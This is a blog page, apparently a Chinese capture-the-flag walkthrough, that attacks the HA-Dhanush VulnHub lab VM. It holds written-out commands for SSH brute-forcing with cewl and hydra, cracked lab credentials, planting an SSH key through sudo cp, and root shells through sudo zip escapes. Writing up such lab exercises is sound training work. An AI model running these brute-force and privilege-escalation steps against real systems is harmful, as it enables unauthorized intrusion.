@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>VulnHub通关日记-HA-Dhanush，一次通过SSH爆破艰难的更换SSH用户,最后使用ZIP提权拿到Root权限 | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub通关日记-HA-Dhanush，一次通过SSH爆破艰难的更换SSH用户,最后使用ZIP提权拿到Root权限</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 1, 2019&nbsp;&nbsp;14:55:14</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=5041667&auto=1&height=66"></iframe>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/645.png" alt="图片"></p>
+<p>HackTheName:HA-Dhanush<br>The Dhanush once was the pinnacle of the weapons technology. It redefined the warfare to a new level and is mentioned in all the Mythological Accounts in the History. Choose Your Dhanush, Stretch the string and Shoot for Root!! ENUMERATION IS THE KEY!!!!!<br>下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/ha-dhanush,396/">https://www.vulnhub.com/entry/ha-dhanush,396/</a><br>难度：中等<br>目的：拿到 Root 权限<br>攻击机器KALI：192.168.136.138</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>在拿到靶机在<code>VMware</code>虚拟机运行后。我们得知道靶机的IP是多少，使用<code>netdiscover</code>命令来查看当前网络中存活主机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/646.png" alt="图片"></p>
+<p>经过探测得知目标靶机的<code>IP</code>为<code>192.168.136.141</code>。现在有了IP地址，那么还是老规矩，扫扫端口看看开放了那些服务器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A -O 192.168.136.141</span><br><span class="line">-p-：是扫描从1-65535的所有端口</span><br><span class="line">-A：探测操作系统版本</span><br><span class="line">-O：探测所使用的操作系统</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/647.png" alt="图片"></p>
+<p>从上图得知，它开放了<code>80</code>（http）、<code>65345</code>（SSH）端口，论扫描端口的重要性！它把<code>SSH</code>端口更改为<code>65345</code>了，所使用的操作系统是<code>Ubuntu</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">65345/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br></pre></td></tr></table></figure>
+
+<p>访问：<code>http://192.168.136.141</code> 发现<code>Web</code>网页中没得啥可以利用的地方，只有一段我看不懂的文字，好像是马拉地语？</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/648.png" alt="图片"></p>
+<p>Google 翻译过来是：这种宗教不时从印度消失。 就职典礼 恶魔般的圣徒灭亡。 Sambhavami Yuga Yuga建立佛法。<br>好吧，我文盲！不懂说的是什么意思…</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/649.png" alt="图片"></p>
+<p>老规矩，继续枚举一下目录结构看看有没有什么可以利用的文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.136.141/ </span><br><span class="line">python3 dirsearch.py -u http://192.168.136.141/ -e .txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/650.png" alt="图片"></p>
+<p>吗的，没有啥可以利用的文件啊，这可咋整？别急！当我一筹莫展的时候，我回过头来看目标是开启了<code>SSH</code>服务，那么我们应该是要通过<code>SSH</code>枚举爆破来搞的，而经过刚刚的信息收集又得知了一些宗教文字和一些关键字。那么我们就可以通过那些关键字来生成一个<code>爆破字典</code>来对目标SSH进行枚举！</p>
+<h2 id="SSH枚举爆破"><a href="#SSH枚举爆破" class="headerlink" title="SSH枚举爆破"></a>SSH枚举爆破</h2><p>因为Web页面上给了我们一些关键字，那么我们可以通过<code>cewl</code>工具来爬行一下Web页面，来输出一些存在Web页面中的单词或者关键字：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl http://192.168.136.141/ -w dic.txt</span><br><span class="line">-w dic.txt 是指把爬取到的单词关键字保存到当前目录下的dic.txt里</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/651.png" alt="图片"></p>
+<p>有了字典以后，那就爆破吧，使用<code>hydra</code>九头蛇暴力又简单：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hydra -L dic.txt -P dic.txt -t 20 -F -s 65345 192.168.136.141 ssh</span><br><span class="line">-L ：指定用户名的字典</span><br><span class="line">-P ：指定密码的字典</span><br><span class="line">-t ：指定线程数</span><br><span class="line">-F ：一旦爆破成功就停止枚举，不然有好几百个得等好久</span><br><span class="line">-s ：指定 ssh 的端口号</span><br><span class="line">ssh ： 指定爆破的服务</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/652.png" alt="图片"></p>
+<p>很幸运的爆破枚举成功，得到了用户名：<code>pinak</code>、密码：<code>Gandiv</code>、端口：<code>65345</code>。登陆 SSH：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh pinak@192.168.136.141 -p 65345</span><br><span class="line">USER:pinak</span><br><span class="line">PASS:Gandiv</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/653.png" alt="图片"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>回到 <code>/home</code> 目录发现有三个用户：<code>dhanush</code>、<code>pinak</code>、<code>sarang</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/654.png" alt="图片"></p>
+<p>来到 <code>sarang</code> 用户目录下，发现有一个 <code>.ssh</code> 目录，但是有一个问题，我们进不去 <code>sarang</code> 用户的 <code>.ssh</code> 目录，那咋办？其实我们就可以<code>cp</code>把我们的<code>ssh</code>密匙来放到 <code>sarang</code> 的 <code>.ssh</code> 用户目录下（在下文中我们是有cp的root执行权限的）所以我们就可以通过ssh密匙来登陆它的账户！</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/655.png" alt="图片"></p>
+<p>而来到 <code>dhanush</code> 用户目录下，却没有发现可以利用的地方:</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/656.png" alt="图片"></p>
+<p>再来看看当前 <code>pinak</code> 用户有那些执行权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -l ：查看当前自己执行sudo的权限</span><br><span class="line">(sarang) NOPASSWD: /bin/cp：我们不需要通过su密码就可以进行cp命令</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/657.png" alt="图片"></p>
+<p>咳咳，该理理思路了，既然我们只有<code>cp</code>的<code>root</code>权限，那么我们就可以通过<code>pinak</code>用户生成一个<code>SSH</code>的<code>私钥</code>（id_rsa）和<code>公钥</code>（id_rsa.pub），我们只需要将<code>ssh</code>的密匙<code>cp</code>到<code>sarang</code>用户的<code>.ssh</code>目录中，那么我们就可以<code>ssh</code>登陆到<code>sarang</code>用户!</p>
+<h3 id="生成SSH私钥和公钥"><a href="#生成SSH私钥和公钥" class="headerlink" title="生成SSH私钥和公钥"></a>生成SSH私钥和公钥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">私钥和公钥保存到：/home/pinak/.ssh/ 目录下</span><br><span class="line">密码为：liuwx</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/658.png" alt="图片"></p>
+<p>创建一个名为 <code>authorized_keys</code> 的文件，并将 <code>id_rsa.pub</code> 的内容复制到其中。最后再将 <code>authorized_keys</code> 文件复制到 <code>sarang</code> 用户的 <code>.ssh</code> 文件夹里：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 id_rsa.pub</span><br><span class="line">cp id_rsa.pub /home/pinak</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/659.png" alt="图片"></p>
+<p>现在将我们的 <code>id_rsa.pub</code> 公钥<code>cp</code>到<code>sarang</code>的<code>.ssh</code>文件夹下的<code>authorized_keys</code>文件里：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u sarang /bin/cp ./id_rsa.pub /home/sarang/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/660.png" alt="图片"></p>
+<p>通过<code>ssh</code>公钥连接到<code>sarang</code>用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh sarang@127.0.0.1 -i /.ssh/id_rsa -p 65345</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/661.png" alt="图片"></p>
+<p>这个时候就ssh进入到了 <code>sarang</code> 用户，我们再来看看他可以使用那些 <code>root</code> 权限命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/662.png" alt="图片"></p>
+<h3 id="使用sudo和zip提权"><a href="#使用sudo和zip提权" class="headerlink" title="使用sudo和zip提权"></a>使用sudo和zip提权</h3><p>我们可以发现 <code>sarang</code> 用户可以以 <code>root</code> 用户身份权限来运行 <code>zip</code> 命令，那么我们就可以通过 <code>ZIP</code> 来进行提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">具体可以看这篇文章：https://www.freebuf.com/articles/system/206007.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/663.png" alt="图片"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -u)</span><br><span class="line">sudo zip <span class="variable">$TF</span> /etc/hosts -T -TT <span class="string">&#x27;sh #&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/664.png" alt="图片"></p>
+<p>还有一种可以这样玩：先创建一个 <code>liuwx</code> 文件，然后在将它压缩为<code>zip</code>文件，最后使用<code>unzip-command</code>来执行<code>bash</code>命令从而提权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch liuwx</span><br><span class="line">sudo zip /tmp/liuwx.zip /home/sarang/liuwx -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/665.png" alt="图片"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们先是通过<code>Web</code>页面来得到一些关键字单词，通过这些关键词单词生成字典来<code>爆破SSH</code>。然后枚举到了用户<code>pinak</code>进入到<code>pinak</code>用户，这个用户有<code>cp</code>的<code>root</code>执行权限，而<code>sarang</code>用户目录下刚好有<code>.ssh</code>目录，我们通过生成<code>ssh密钥</code>来登陆到<code>sarang</code>用户。最后也是通过<code>ZIP</code>来进行提权拿到<code>Root</code>权限</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/12/01/HA-Dhanush/">http://example.com/2019/12/01/HA-Dhanush/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/12/02/djinn-1/">VulnHub通关日记-djinn-1_一次Fuzz渗透测试拿到Flag</a>
+            
+            
+            <a class="next" rel="next" href="/2019/12/01/HA-Chanakya/">VulnHub通关日记-HA_Chanakya，一次渗透测试入侵再到Chkrootkit提权获取Root权限</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
